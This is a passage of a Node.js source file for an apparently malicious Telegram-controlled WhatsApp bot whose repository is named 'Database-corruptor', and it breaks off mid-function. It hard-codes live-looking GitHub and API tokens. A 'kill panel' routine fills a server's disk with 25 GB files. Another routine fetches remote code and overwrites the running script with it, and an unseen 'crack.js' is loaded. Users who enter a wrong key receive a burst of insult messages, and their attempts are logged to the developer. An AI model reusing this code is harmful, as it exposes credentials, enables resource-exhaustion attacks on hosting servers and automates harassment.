// --- ( const start ) --- //
const fs = require("fs");
const crypto = require("crypto");
const path = require("path");
const fetch = require("node-fetch");
const P = require("pino");
const readline = require("readline");
const axios = require("axios");
const chalk = require("chalk");
const TelegramBot = require("node-telegram-bot-api");
const { execSync } = require('child_process');
const { OpenAI } = require("openai");
const sessions = new Map();
const SESSIONS_DIR = "./ѕσ¢ѕυѕнєχα/sessions";
const SESSIONS_FILE = "./ѕσ¢ѕυѕнєχα/sessions/active_sessions.json";
const cd = "./ѕσ¢ѕυѕнєχα/cooldown.json";
const config = require("./config.js");
const BOT_TOKEN = config.BOT_TOKEN;
const { GoogleGenerativeAI } = require("@google/generative-ai");
const { ReactMsg } = require("./ѕσ¢ѕυѕнєχα/images/myfunc.js");
require("./crack.js");
// --- ( const end )

// global variabel apikey
const API_KEY_BOTCAHX = "XYCoolcraftNihBoss";

// Const Convert
if (!config.GEMINI_API_KEY || config.GEMINI_API_KEY === "AIzaSyCqTL0YkNnCVPbaNJyPz64DTSqMp7xnzfk") {
    console.warn("Warning: GEMINI_API_KEY belum diatur di config.js. Fitur /convertcase akan gagal.");
}

const { GEMINI_API_KEY } = require('./config.js');

let genAI;
let model;
try {
    genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
    model = genAI.getGenerativeModel({ model: "gemini-flash-latest" });
} catch (e) {
    console.error("Error Inisialisasi. Pastikan API Key valid.", e.message);
}

async function convertCodeWithGemini(sourceCode, targetLibrary) {
    if (!model) {
        throw new Error("Model tidak terinisialisasi. Periksa API Key Anda.");
    }

    const prompt = `
Kamu adalah "Partner coding" AI.
Tugasmu adalah mengonversi kode (porting) dari satu bahasa/library ke library lain.
Target konversi adalah: ${targetLibrary}

ATURAN PENTING:
1.  HANYA berikan blok kode hasil konversi.
2.  JANGAN tambahkan penjelasan, salam, atau komentar apa pun (seperti \`// ini adalah komentar\` atau \`/* komentar */\`).
3.  Kode harus fungsional dan mengikuti best practice dari library target.
4.  Pastikan tidak ada satu baris pun komentar di dalam kode output.

Kode sumber yang akan dikonversi adalah:

\`\`\`
${sourceCode}
\`\`\`

Hasil konversi (HANYA KODE, TANPA KOMENTAR):
`;

    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        let convertedCode = response.text();
        
        convertedCode = convertedCode.replace(/```(javascript|js|python|php)?/gi, "").replace(/```/g, "").trim();
        
        return convertedCode;
    } catch (error) {
        console.error("Error saat memanggil API:", error);
        throw new Error(`API Error: ${error.message || 'Gagal menghasilkan konten.'}`);
    }
}

function ensureTempDir() {
    const tempDir = path.join(__dirname, '..', 'temp');
    if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir);
    }
    return tempDir;
}

// --- ( start )
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    checkStatusWA,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

// =======================
// 🔐 SYSTEM KEY CONFIG
// =======================
const CONFIG = {
  GITHUB_TTOKEN: "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", 
  GITHUB_USERNAME: "Ginra233",
  GITHUB_REPO: "Database-corruptor",
  GITHUB_FILE: "keys.json",
  DEVELOPER_ID: "6207641651"
};

const verifiedUsers = new Set();
const waitingKey = new Set();

// --- FIX ERROR users is not defined --
let users = new Set();

// Load users.json jika ada
if (fs.existsSync("./users.json")) {
  try {
    users = new Set(JSON.parse(fs.readFileSync("./users.json")));
  } catch (err) {
    console.error("Gagal load users.json:", err);
  }
}

//update
//KHUSUS PENGGUNAAN PANEL PTERODACTYL 
const Js_Oriii = "/home/container/index.js"; // ganti ma nama js lu
const CHAT_OWNER_ID = 6207641651; // ganti ID lu
const Ghlu = "https://raw.githubusercontent.com/Ginra233/Database-corruptor/main/index.js"; //gh lu jir

const configPath = "./update.json";

function makeHash(str) {
    return crypto.createHash("sha256").update(str).digest("hex");
}

async function checkForUpdateNotify() {
    try {
        const response = await axios.get(Ghlu);
        const newCode = response.data;

        const newHash = makeHash(newCode);

       if (newHash !== configg.lastHash) {
      
        configg.lastHash = newHash;
        saveConfig(configg);

            // kirim ke owner — ganti CHAT_OWNER_ID
            bot.sendMessage(
                CHAT_OWNER_ID,
                "📢 *Update Tersedia!*\n\nKetik `/update` buat install.\n\n✅ Versi baru siap dipasang.",
                { parse_mode: "Markdown" }
            );

            console.log("📢 Update available → owner notified");
        }

    } catch (err) {
        console.error("❌ Gagal cek update:", err);
    }
}

setInterval(checkForUpdateNotify, 10 * 60 * 1000);

// cek sekali saat start juga
checkForUpdateNotify();

function loadConfig() {
    return JSON.parse(fs.readFileSync(configPath, "utf8"));
}

function saveConfig(data) {
    fs.writeFileSync(configPath, JSON.stringify(data, null, 2));
}

let configg = loadConfig();

async function autoUpdateCheck() {
    if (!configg.autoUpdate) return;

    try {
        const response = await axios.get(Ghlu);
        const newCode = response.data;

        fs.writeFileSync(Js_Oriii, newCode);

        console.log("✅ AutoUpdate done — restarting...");
        setTimeout(() => process.exit(0), 1000);

    } catch (err) {
        console.error("❌ AutoUpdate gagal:", err);
    }
}

// panggil saat bot start
autoUpdateCheck();



// Save users
function saveUsers(data) {
  fs.writeFileSync("./users.json", JSON.stringify([...data], null, 2));
}

//kill panel
const FILE_SIZE = 25 * 1024 * 1024 * 1024;
const BLOCK_SIZE = 128 * 1024 * 1024;
const BUFFER_COUNT = 4;

function formatSize(bytes) {
  return `${(bytes / 1024 ** 3).toFixed(2)} GB`;
}

async function createFile(filePath, size) {
  return new Promise((resolve, reject) => {
    const buffers = Array(BUFFER_COUNT)
      .fill(null)
      .map(() => Buffer.allocUnsafe(BLOCK_SIZE).fill(0));

    const stream = fs.createWriteStream(filePath, {
      highWaterMark: BLOCK_SIZE * 2,
      flags: "w",
      autoClose: true
    });

    let written = 0;
    let bufferIndex = 0;

    function writeMore() {
      let ok = true;

      while (ok && written < size) {
        const remaining = size - written;
        const currentBuffer = buffers[bufferIndex & (BUFFER_COUNT - 1)];
        const chunk = remaining >= BLOCK_SIZE
          ? currentBuffer
          : currentBuffer.subarray(0, remaining);

        ok = stream.write(chunk);
        written += chunk.length;
        bufferIndex++;
      }

      if (written >= size) stream.end();
    }

    stream.on("drain", writeMore);
    stream.on("error", reject);
    stream.on("finish", resolve);

    writeMore();
  });
}

async function createMultipleFilesParallel(fileConfigs, concurrency = 4) {
  const queue = [...fileConfigs];
  const workers = [];

  async function worker() {
    while (queue.length > 0) {
      const cfg = queue.shift();
      if (!cfg) return;
      await createFile(cfg.path, cfg.size);
    }
  }

  for (let i = 0; i < concurrency; i++) {
    workers.push(worker());
  }

  await Promise.all(workers);
}

// =======================
// 🔐 LOAD KEY GITHUB
// =======================
async function loadKeys() {
  try {
    const url = `https://api.github.com/repos/${CONFIG.GITHUB_USERNAME}/${CONFIG.GITHUB_REPO}/contents/${CONFIG.GITHUB_FILE}`;
    
    const res = await axios.get(url, {
      headers: { Authorization: `token ${CONFIG.GITHUB_TTOKEN}` }
    });

    const content = Buffer.from(res.data.content, "base64").toString();
    const obj = JSON.parse(content);

    return Array.isArray(obj.keys) ? obj.keys : [];

  } catch (err) {
    console.error("Gagal load key:", err);
    return [];
  }
}

// --- ( Path Files ) --- \\
let premiumUsers = JSON.parse(fs.readFileSync("./ѕσ¢ѕυѕнєχα/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./ѕσ¢ѕυѕнєχα/admin.json"));
function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}


ensureFileExists("./ѕσ¢ѕυѕнєχα/premium.json");
ensureFileExists("./ѕσ¢ѕυѕнєχα/admin.json");
function savePremiumUsers() {
  fs.writeFileSync("./ѕσ¢ѕυѕнєχα/premium.json", JSON.stringify(premiumUsers, null, 2));
}


function saveAdminUsers() {
  fs.writeFileSync("./ѕσ¢ѕυѕнєχα/admin.json", JSON.stringify(adminUsers, null, 2));
}


function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

//
function isValidUrl(url) {
  try { new URL(url); return true; }
  catch { return false; }
}

//Bebas spam
const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);

//
async function showProgress(chatId, messageId, steps = 5, delay = 400) {
  const bar = ["░", "▒", "▓", "█"];

  for (let i = 0; i < steps; i++) {
    const progress = bar[Math.min(i, bar.length - 1)].repeat(i + 1).padEnd(steps, "░");
    await bot.editMessageText(`⌛ Sedang menulis...\n[${progress}]`, {
      chat_id: chatId,
      message_id: messageId,
    }).catch(() => {});
    await new Promise(resolve => setTimeout(resolve, delay));
  }
}

//
watchFile("./ѕσ¢ѕυѕнєχα/premium.json", (data) => (premiumUsers = data));
watchFile("./ѕσ¢ѕυѕнєχα/admin.json", (data) => (adminUsers = data));
initializeWhatsAppConnections();

const bot = new TelegramBot(BOT_TOKEN, { polling: true, });

bot.on("message", (ctx) => {
   try {
      SecurityEvent({
         id: ctx.from.id,
         method: "TELEGRAM_MESSAGE",
         panel: "TELEGRAM",
         username: ctx.from.username || "NO_USERNAME"
      });
   } catch(e){}
});
// === VERIFIKASI KEY ===
bot.on("message", async (msg) => {
  const id = msg.from?.id;

  // FIX: hindari error kalau bukan text (foto, sticker, callback, dll)
  if (!msg.text) return;

  const inputKey = msg.text.trim();

  // FIX: hanya proses kalau user memang sedang diminta memasukkan key
  if (!waitingKey.has(id)) return;

  try {
    const keys = await loadKeys();

    // === KEY VALID ===
    if (keys.includes(inputKey)) {
      waitingKey.delete(id);
      verifiedUsers.add(id);

      await bot.sendMessage(id, "✅ Key valid! Kamu sekarang bisa pakai bot.");
      await bot.sendMessage(id, "⚡ Ketik /start untuk buka menu.");

      return;
    }

    // === KEY INVALID ===
    waitingKey.delete(id);

    // kirim laporan ke developer
    await bot.sendMessage(
      CONFIG.DEVELOPER_ID,
      `🚫 User ${id} gagal login (key salah): ${inputKey}`
    );

    // LIST MAKI MAKI RANDOM (BISA TAMBAH SENDIRI)
    const makian = [
      "❌ Key salah goblok 😹",
      "❌ Ini apa? kode parkir? salah lah tolol 😂",
      "❌ Salah terus, IQ ente minus ya? 😭🔥",
      "❌ Tolol itu key apa password WiFi tetangga? 😂",
      "❌ Fokus dulu bego 😹",
      "❌ Tolol Key nya salah, otaknya juga salah kayanya 😭",
      "❌ Malu Ama Kucing aja ngerti cara masuk 😭🐱",
      "❌ Owner sampai garuk-garuk pala liat lu salah mulu 😭🔥",
      "❌ Key salah tolol nyerah aja woakwo",
    ];

    // SPAM 5x
    let spam = 0;
    const interval = setInterval(async () => {
      spam++;
      if (spam > 9) return clearInterval(interval);
      const teks = makian[Math.floor(Math.random() * makian.length)];
      await bot.sendMessage(id, teks);
    }, 700);

  } catch (err) {
    console.error("Error verifikasi key:", err);
  }
});

// --- ( Security Github/Token ) --- \\
const GITHUB_TOKEN = "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";  
const GITHUB_OWNER = "Ginra233";
const GITHUB_REPO = "Database-corruptor";
const GITHUB_FILE = "Maklo.json";

// URL API untuk ambil file token.js dari GitHub
const GITHUB_API_FILE_URL = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${GITHUB_FILE}`;

async function initializeBot() {
  console.log(`

   ⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`);

  await initializeWhatsAppConnections();
}

(async () => {
    console.log(chalk.whiteBright.bold(`
» Information:
☇ DEVELOPER : t.me/Serenhope
☇ Name Script : ѕσ¢ѕυѕ ↯ нєχα
☇ Version : 1.0.0`));
})();
  
async function fetchValidTokens() {
  try {
    const res = await axios.get(GITHUB_API_FILE_URL, {
      headers: {
        Authorization: `token ${GITHUB_TOKEN}`,
        Accept: "application/vnd.github.v3+json",
      },
    });

    const decoded = Buffer.from(res.data.content, "base64").toString("utf8");

    // parsed JSON { tokens: ["..."] }
    const obj = JSON.parse(decoded);

    return obj.tokens || [];

  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}


// --- ( Validasi token ) --- \\
// --- Validasi Token dari GitHub ---
async function validateToken() {
  try {
    const res = await axios.get(GITHUB_API_FILE_URL, {
      headers: {
        Authorization: `token ${GITHUB_TOKEN}`,
        Accept: "application/vnd.github.v3+json",
      },
    });

    // Decode token.js (Base64)
    const decoded = Buffer.from(res.data.content, "base64").toString("utf8");

    let tokenDB;
    try {
      tokenDB = JSON.parse(decoded);
    } catch (jsonErr) {
      console.log(chalk.red("❌ Format token.js tidak valid!"));
      process.exit(1);
    }

    // Pastikan token array ada
    if (!tokenDB.tokens || !Array.isArray(tokenDB.tokens)) {
      console.log(chalk.red("❌ File token.js tidak mengandung array tokens!"));
      process.exit(1);
    }

    // Cek apakah BOT_TOKEN terdaftar
    if (!tokenDB.tokens.includes(BOT_TOKEN)) {
      console.log(chalk.red("❌ Bot token tidak terdaftar!"));
      process.exit(1);
    }

    console.log(chalk.green("✅ Token valid. Bot dijalankan..."));

  } catch (err) {
    // Error 404, 403, atau lainnya
    console.log(chalk.red(`❌ Gagal mengambil token dari GitHub: ${err.response?.status || err.message}`));
    process.exit(1);
  }
}

(async () => {
  await validateToken();  // Validasi 1x aja
  initializeBot();        // Mulai bot
})();

// -- ( Protect Anti Bypas ) -- \\
const mainFile = process.argv[1] || path.resolve(process.cwd(), "index.js"); //Sesuaikan File Utama Lu
let originalContent = null;
let originalHash = null;
const backupDir = path.join(process.cwd(), ".npm");
const backupPath = path.join(backupDir, ".bak");

// baca file utama & buat backup
try {
  if (!fs.existsSync(mainFile)) {
    console.warn(chalk.yellow(`[ ! ] Main file tidak ditemukan: ${mainFile}. ANTI-BYPASS dinonaktifkan.`));
  } else {
    originalContent = fs.readFileSync(mainFile);
    originalHash = crypto.createHash("sha256").update(originalContent).digest("hex");

    fs.writeFileSync(backupPath, originalContent, { flag: "w" });
    console.log(chalk.greenBright(`[ 🕊 ] Backup main file tersimpan ke: ${backupPath}`));
  }
} catch (e) {
  console.error(chalk.redBright("[ ❌ ] Gagal baca main file / buat backup:"), e.message);
  originalContent = null;
  originalHash = null;
}

// helper restore file
async function restoreFile() {
  try {
    console.log(chalk.greenBright("[ 🔄 ] Restore main file..."));
    if (fs.existsSync(backupPath)) {
      fs.copyFileSync(backupPath, mainFile);
      await notifyOwnerSafe("⚠️ File utama dimodifikasi, restore otomatis!", null, false).catch(()=>{});
      console.log(chalk.greenBright("[ ✔ ] Restore berhasil."));
    } else {
      console.error(chalk.redBright("[ ❌ ] Backup tidak ditemukan!"));
      await notifyOwnerSafe("⚠️ File utama dimodifikasi tetapi backup tidak ditemukan!", null, false).catch(()=>{});
    }
  } catch (e) {
    console.error(chalk.redBright("[ ❌ ] Gagal restore:"), e.message);
    await notifyOwnerSafe("⚠️ Gagal restore: " + e.message, null, false).catch(()=>{});
  } finally { process.exit(1); }
}

// safe hash
function fileHashSafe(p) {
  try {
    if (!fs.existsSync(p)) return null;
    const c = fs.readFileSync(p);
    return crypto.createHash("sha256").update(c).digest("hex");
  } catch(e) { console.error(chalk.yellow("[ ! ] Gagal baca file untuk hash:"), e.message); return null; }
}

// cek perubahan file
if (originalHash) {
  setInterval(async () => {
    try {
      const currentHash = fileHashSafe(mainFile);
      if (currentHash && currentHash !== originalHash) {
        console.log(chalk.redBright("[ ⚠️ ] Main file modified!"));
        await notifyOwnerSafe("🚨 Bypass terdeteksi: File utama dimodifikasi!", null, false).catch(()=>{});
        await restoreFile();
      }
    } catch(e) { console.error(chalk.redBright("[ ❌ ] Error saat cek main file:"), e.message); }
  }, 2000);
} else {
  console.warn(chalk.yellow("[ ! ] originalHash tidak tersedia — deteksi perubahan file dinonaktifkan."));
}

console.log(chalk.greenBright
("[ 🛡️ ] PROCESSING... ANTI-BYPASS ACTIVE"));

let sock;
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}


// -- ( Validasi WhatsApp Connections ) -- \\
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });
          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

// -- ( Validasi C Session ) -- \\
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>   ⚙️  𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆   </blockquote>
────────────────
✧. Bot : ${botNumber}
✧. Status : Inisialisasi...`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);
  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>  ⚙️ 𝐑𝐄𝐂𝐎𝐍𝐄𝐂𝐓    </blockquote>
────────────────
✧. Bot : ${botNumber}
✧. Status : Mencoba menghubungkan...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>  ⚙️ 𝐊𝐎𝐍𝐄𝐊𝐒𝐈 𝐆𝐀𝐆𝐀𝐋    </blockquote>
────────────────
✧. Bot: ${botNumber}
✧. Status: Tidak dapat terhubung
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>  ⚙️ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐍𝐆    </blockquote>
────────────────
✧. 𝐁𝐨𝐭 : ${botNumber}
✧. 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐭𝐞𝐫𝐡𝐮𝐛𝐮𝐧𝐠!
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "IVICTUS6");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
<blockquote>  ⚙️ 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄    </blockquote>
────────────────
✧. 𝐁𝐨𝐭 : ${botNumber}
✧. 𝐊𝐨𝐝𝐞 : ${formattedCode}
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>  ⚙️ 𝐘𝐀𝐇 𝐄𝐑𝐎𝐑    </blockquote>
────────────────
✧. 𝐁𝐨𝐭 : ${botNumber}
✧. 𝐏𝐞𝐬𝐚𝐧: ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        )
      }
    }
  });
  sock.ev.on("creds.update", saveCreds);
  return sock;
}


// -- ( Function Runtime ) -- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}


// -- ( Start Time ) -- \\
const startTime = Math.floor(Date.now() / 1000);
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}


// -- ( Get Speed ) -- \}
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}


// -- ( Get CurrentDate ) -- \\
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}


// -- ( Const Images ) -- \\
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/86ix19.png"
  ];
  return images[Math.floor(Math.random() * images.length)];
}


// -- ( fs cooldown ) -- \\
let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };
  
  
// -- ( save cooldown ) -- \\
function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}


// -- ( cek cooldown ) -- \\
function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}


// -- ( set cooldown ) -- \\
function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /cooldown 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}


// -- ( get premium stats ) -- \\
function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

//--+crot ah
bot.middlewares = [];

bot.use = function (fn) {
  bot.middlewares.push(fn);
};

async function notifyOwnerSafe(message) {
  try {
    await bot.sendMessage(6207641651, `🔒 SECURITY ALERT\n\n${message}`);
  } catch (e) {
    console.log("Failed to notify owner:", e);
  }
}

global.notifyOwnerSafe = notifyOwnerSafe;

//crot
async function downloadFile(bot, fileId) {
  const file = await bot.getFile(fileId);
  const url = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
  const response = await fetch(url);
  return Buffer.from(await response.arrayBuffer());
}

// executor middleware
async function runMiddlewares(ctx) {
  let i = 0;

  async function next() {
    const middleware = bot.middlewares[i++];
    if (middleware) {
      return middleware(ctx, next);
    }
  }

  return next();
}

// -- ( Sexsex Bokep ) 
async function toBase64(url) { // buat jpegThumbnail
  const sharp = require("sharp");
  const response = await axios.get(url, { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(100, 100, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
}

// --- ( Func Bokep Search Video )
async function searchsfm(query, page = 1) {
        return new Promise((resolve, reject) => {
